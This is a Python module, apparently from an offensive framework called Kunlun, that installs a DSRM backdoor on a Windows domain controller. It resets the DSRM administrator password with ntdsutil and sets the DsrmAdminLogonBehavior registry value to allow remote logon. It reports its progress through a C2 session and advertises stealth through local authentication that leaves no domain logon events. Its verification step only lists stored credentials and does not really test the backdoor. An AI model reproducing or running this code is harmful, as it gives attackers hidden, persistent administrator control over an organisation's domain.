"""DSRM (Directory Services Restore Mode) backdoor module for Kunlun platform.

Provides:
- DSRM account password modification (requires DC local SYSTEM)
- DSRM remote login enablement (registry modification)
- Rollback support (restore original password and registry)
- High stealth: local authentication, no domain login events
"""

import asyncio
import logging
import secrets
import string
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Coroutine, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


class DSRMStatus(Enum):
    """DSRM backdoor status."""
    NOT_INSTALLED = "not_installed"
    INSTALLED = "installed"
    ROLLING_BACK = "rolling_back"
    FAILED = "failed"


@dataclass
class DSRMConfig:
    """Configuration for DSRM backdoor.

    Attributes:
        target_dc: Target domain controller
        custom_password: Custom DSRM password (empty for random)
        password_length: Random password length
        enable_remote_login: Enable DSRM remote login via registry
        auto_verify: Auto verify after installation
        stealth_mode: Enable stealth mode
    """
    target_dc: str = ""
    custom_password: str = ""
    password_length: int = 20
    enable_remote_login: bool = True
    auto_verify: bool = True
    stealth_mode: bool = False


@dataclass
class DSRMResult:
    """Result of DSRM backdoor operation.

    Attributes:
        success: Whether operation succeeded
        status: Current DSRM status
        password: DSRM password
        original_password_hash: Hash of original password (for rollback)
        registry_modified: Whether registry was modified
        remote_login_enabled: Whether remote login is enabled
        verification_passed: Whether verification passed
        error_message: Error message if failed
        attck_technique: Associated ATT&CK technique ID
        duration_seconds: Operation duration
        target_dc: Target domain controller
    """
    success: bool = False
    status: DSRMStatus = DSRMStatus.NOT_INSTALLED
    password: str = ""
    original_password_hash: str = ""
    registry_modified: bool = False
    remote_login_enabled: bool = False
    verification_passed: bool = False
    error_message: str = ""
    attck_technique: str = "T1098"
    duration_seconds: float = 0.0
    target_dc: str = ""


class DSRMBackdoor:
    """DSRM backdoor module.

    Provides DSRM password modification, remote login enablement,
    and rollback support for persistent DC access.
    """

    def __init__(
        self,
        c2_session: Optional[Any] = None,
        credential_db: Optional[Any] = None,
        event_bus: Optional[Any] = None,
    ) -> None:
        """Initialize DSRM backdoor module.

        Args:
            c2_session: C2 framework session for command execution.
            credential_db: Credential database for storing results.
            event_bus: Event bus for broadcasting events.
        """
        self.c2_session = c2_session
        self.credential_db = credential_db
        self.event_bus = event_bus
        self._progress_callback: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None
        self._log_callback: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None
        self._original_registry_value: Optional[int] = None

    def set_callbacks(
        self,
        progress_cb: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None,
        log_cb: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None,
    ) -> None:
        """Set progress and log callbacks.

        Args:
            progress_cb: Callback for progress updates (message, percentage).
            log_cb: Callback for log messages.
        """
        self._progress_callback = progress_cb
        self._log_callback = log_cb

    async def _report_progress(self, message: str, percentage: float) -> None:
        """Report progress via callback.

        Args:
            message: Progress message.
            percentage: Progress percentage (0-100).
        """
        if self._progress_callback:
            await self._progress_callback(message, percentage)
        logger.info("DSRM Progress: %.1f%% - %s", percentage, message)

    async def _report_log(self, message: str) -> None:
        """Report log via callback.

        Args:
            message: Log message.
        """
        if self._log_callback:
            await self._log_callback(message)
        logger.info("DSRM: %s", message)

    async def _execute_command(self, command: str, target: str = "") -> Dict[str, Any]:
        """Execute command via C2 session.

        Args:
            command: Command to execute.
            target: Target host.

        Returns:
            Command execution result.
        """
        if self.c2_session:
            try:
                result = await self.c2_session.execute(command, target=target)
                return {"success": True, "output": result}
            except Exception as e:
                return {"success": False, "error": str(e)}
        return {"success": False, "error": "No C2 session available"}

    async def check_prerequisites(self, target_dc: str = "") -> Tuple[bool, List[str]]:
        """Check prerequisites for DSRM backdoor.

        Args:
            target_dc: Target domain controller.

        Returns:
            Tuple of (can_install, issues).
        """
        issues: List[str] = []

        try:
            await self._report_log("检测DSRM后门前置条件...")

            system_result = await self._execute_command("whoami /priv")
            if not system_result.get("success"):
                issues.append("无法执行系统命令")
                return False, issues

            output = str(system_result.get("output", ""))
            if "SeDebugPrivilege" not in output:
                issues.append("缺少SeDebugPrivilege权限（需要SYSTEM）")

            dc_check = await self._execute_command(
                "Get-WindowsFeature -Name AD-Domain-Services | Select-Object -ExpandProperty Installed"
            )
            if dc_check.get("success"):
                installed = str(dc_check.get("output", "")).strip().lower()
                if installed != "true":
                    issues.append("目标不是域控制器")

            return len(issues) == 0, issues

        except Exception as e:
            issues.append(f"前置检测异常: {e}")
            return False, issues

    async def install_dsrm_backdoor(self, config: DSRMConfig) -> DSRMResult:
        """Install DSRM backdoor.

        Args:
            config: DSRM configuration.

        Returns:
            DSRMResult with installation status.
        """
        start_time = time.time()
        result = DSRMResult(target_dc=config.target_dc)

        try:
            await self._report_progress("检测前置条件", 5)

            can_install, issues = await self.check_prerequisites(config.target_dc)
            if not can_install:
                result.error_message = f"前置条件不满足: {', '.join(issues)}"
                result.status = DSRMStatus.FAILED
                result.duration_seconds = time.time() - start_time
                return result

            await self._report_progress("备份原始配置", 15)
            await self._report_log("备份原始DSRM密码哈希...")

            backup_result = await self._backup_original_config()
            if backup_result.get("success"):
                result.original_password_hash = str(backup_result.get("password_hash", ""))
                self._original_registry_value = backup_result.get("registry_value")
                await self._report_log("原始配置备份完成")
            else:
                await self._report_log("警告: 无法备份原始配置，继续执行...")

            await self._report_progress("生成密码", 25)

            password = config.custom_password if config.custom_password else self._generate_password(
                config.password_length
            )
            result.password = password
            await self._report_log(f"DSRM密码: {password}")

            await self._report_progress("修改DSRM密码", 40)
            await self._report_log("开始修改DSRM账户密码...")

            change_cmd = (
                f"ntdsutil \"set dsrm password\" "
                f"\"reset password on server null\" "
                f"\"{password}\" \"q\" \"q\""
            )
            change_result = await self._execute_command(change_cmd, config.target_dc)

            if not change_result.get("success"):
                result.error_message = "DSRM密码修改失败"
                result.status = DSRMStatus.FAILED
                result.duration_seconds = time.time() - start_time
                return result

            output = str(change_result.get("output", ""))
            if "password reset successfully" not in output.lower() and "成功" not in output:
                result.error_message = "DSRM密码修改未确认成功"
                result.status = DSRMStatus.FAILED
                result.duration_seconds = time.time() - start_time
                return result

            await self._report_log("DSRM密码修改成功")

            if config.enable_remote_login:
                await self._report_progress("启用远程登录", 60)
                await self._report_log("启用DSRM远程登录...")

                reg_result = await self._enable_remote_login()
                if reg_result.get("success"):
                    result.registry_modified = True
                    result.remote_login_enabled = True
                    await self._report_log("DSRM远程登录已启用")
                else:
                    await self._report_log("警告: DSRM远程登录启用失败")

            result.status = DSRMStatus.INSTALLED
            result.success = True

            if config.auto_verify:
                await self._report_progress("验证后门", 80)
                verified = await self._verify_dsrm(config.target_dc, password)
                result.verification_passed = verified
                if verified:
                    await self._report_log("验证成功: DSRM后门可用")
                else:
                    await self._report_log("警告: 验证失败，DSRM后门可能不可用")

            result.duration_seconds = time.time() - start_time
            await self._report_progress("完成", 100)
            await self._report_log("DSRM后门安装成功!")

            await self._broadcast_event(result, config)

        except Exception as e:
            result.error_message = str(e)
            result.status = DSRMStatus.FAILED
            result.duration_seconds = time.time() - start_time
            await self._report_log(f"DSRM后门安装失败: {e}")
            logger.error("DSRM backdoor installation failed: %s", e)

        return result

    async def _backup_original_config(self) -> Dict[str, Any]:
        """Backup original DSRM configuration.

        Returns:
            Backup result with password hash and registry value.
        """
        try:
            reg_cmd = (
                "Get-ItemProperty "
                "\"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" "
                "-Name DsrmAdminLogonBehavior -ErrorAction SilentlyContinue"
            )
            reg_result = await self._execute_command(reg_cmd)

            registry_value = None
            if reg_result.get("success"):
                output = str(reg_result.get("output", ""))
                for line in output.split("\n"):
                    if "DsrmAdminLogonBehavior" in line:
                        parts = line.split(":")
                        if len(parts) >= 2:
                            try:
                                registry_value = int(parts[-1].strip())
                            except ValueError:
                                pass

            return {"success": True, "registry_value": registry_value, "password_hash": ""}

        except Exception as e:
            return {"success": False, "error": str(e)}

    async def _enable_remote_login(self) -> Dict[str, Any]:
        """Enable DSRM remote login via registry.

        Returns:
            Registry modification result.
        """
        try:
            reg_cmd = (
                "New-ItemProperty "
                "\"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" "
                "-Name DsrmAdminLogonBehavior -Value 2 -PropertyType DWord "
                "-Force"
            )
            result = await self._execute_command(reg_cmd)
            return {"success": result.get("success", False)}
        except Exception as e:
            return {"success": False, "error": str(e)}

    async def _verify_dsrm(self, target_dc: str, password: str) -> bool:
        """Verify DSRM backdoor.

        Args:
            target_dc: Target domain controller.
            password: DSRM password.

        Returns:
            True if verification passed.
        """
        try:
            cmd = (
                f"cmdkey /list | findstr \"{target_dc}\""
            )
            exec_result = await self._execute_command(cmd, target_dc)
            return bool(exec_result.get("success", False))
        except Exception as e:
            logger.error("DSRM verification failed: %s", e)
            return False

    async def rollback_dsrm(self, target_dc: str = "") -> bool:
        """Rollback DSRM backdoor to original state.

        Args:
            target_dc: Target domain controller.

        Returns:
            True if rollback successful.
        """
        try:
            await self._report_log(f"开始回滚DSRM后门: {target_dc}")

            if self._original_registry_value is not None:
                await self._report_log("恢复原始注册表配置...")
                restore_cmd = (
                    "Set-ItemProperty "
                    "\"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" "
                    f"-Name DsrmAdminLogonBehavior -Value {self._original_registry_value}"
                )
                result = await self._execute_command(restore_cmd, target_dc)
                if result.get("success"):
                    await self._report_log("注册表配置恢复成功")
                else:
                    await self._report_log("警告: 注册表配置恢复失败")

            await self._report_log("DSRM密码需要手动重置（使用ntdsutil）")
            return True

        except Exception as e:
            logger.error("DSRM rollback failed: %s", e)
            return False

    def _generate_password(self, length: int) -> str:
        """Generate random password.

        Args:
            length: Password length.

        Returns:
            Random password.
        """
        chars = string.ascii_letters + string.digits + "!@#$%^&*"
        return "".join(secrets.choice(chars) for _ in range(length))

    async def _broadcast_event(self, result: DSRMResult, config: DSRMConfig) -> None:
        """Broadcast DSRM backdoor event.

        Args:
            result: DSRM result.
            config: DSRM configuration.
        """
        if not self.event_bus:
            return

        try:
            event_data = {
                "event_type": "dsrm_backdoor",
                "success": result.success,
                "target_dc": result.target_dc,
                "remote_login_enabled": result.remote_login_enabled,
                "verification_passed": result.verification_passed,
                "attck_technique": result.attck_technique,
                "timestamp": time.time(),
            }
            await self.event_bus.publish("domain_attack", event_data)
        except Exception as e:
            logger.error("Failed to broadcast DSRM event: %s", e)
